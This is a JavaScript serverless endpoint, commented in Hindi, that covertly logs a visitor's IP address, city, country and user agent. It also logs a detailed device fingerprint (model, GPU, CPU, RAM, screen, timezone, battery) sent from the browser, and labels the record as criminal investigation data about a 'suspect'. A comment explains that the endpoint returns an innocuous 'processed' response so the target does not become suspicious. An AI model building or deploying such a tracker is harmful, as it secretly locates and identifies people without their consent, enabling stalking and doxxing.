export default async function handler(req, res) {
    // CORS सुरक्षा नीतियां
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        try {
            // 1. नेटवर्क लेवल डेटा निकालें
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
            const country = req.headers['x-vercel-ip-country'] || "Unknown Country";
            const city = req.headers['x-vercel-ip-city'] || "Unknown City";
            const userAgentString = req.headers['user-agent'] || "Unknown UA";

            // 2. ब्राउज़र (Client) से भेजा गया हार्डवेयर डेटा
            const hardwareData = req.body || {};

            // 3. पूरा फोरेंसिक लॉग कंबाइन करें
            const comprehensiveLog = {
                CASE_STATUS: "SUSPECT_INTERACTION_DETECTED",
                TIMESTAMP: new Date().toISOString(),
                NETWORK: {
                    ip_address: ip,
                    location: `${city}, ${country}`
                },
                BROWSER_USER_AGENT: userAgentString,
                HARDWARE_FINGERPRINT: {
                    exact_model: hardwareData.exactModel || "N/A",
                    os_version: hardwareData.osVersion || "N/A",
                    gpu_renderer: hardwareData.gpuRenderer || "N/A",
                    cpu_cores: hardwareData.cores || "N/A",
                    ram_memory: hardwareData.ram || "N/A",
                    screen_resolution: hardwareData.screenRes || "N/A",
                    pixel_ratio: hardwareData.pixelRatio || "N/A",
                    timezone: hardwareData.timezone || "N/A",
                    // 🔋 बैटरी की जानकारी यहाँ जोड़ दी गई है
                    battery_level: hardwareData.batteryLevel || "N/A",
                    is_charging: hardwareData.isCharging || "N/A"
                }
            };

            // 🔥 यह डेटा Vercel के लाइव डैशबोर्ड पर प्रिंट होगा
            console.log("==================== CRIMINAL INVESTIGATION DATA ====================");
            console.log(JSON.stringify(comprehensiveLog, null, 2));
            console.log("=====================================================================");

            // संदिग्ध को सामान्य रिस्पॉन्स दें ताकि उसे कोई शक न हो
            return res.status(200).json({ status: "processed" });
        } catch (err) {
            console.error("Internal Server Logger Error:", err.message);
            return res.status(500).json({ error: err.message });
        }
    }

    return res.status(405).json({ error: "Method not allowed" });
}
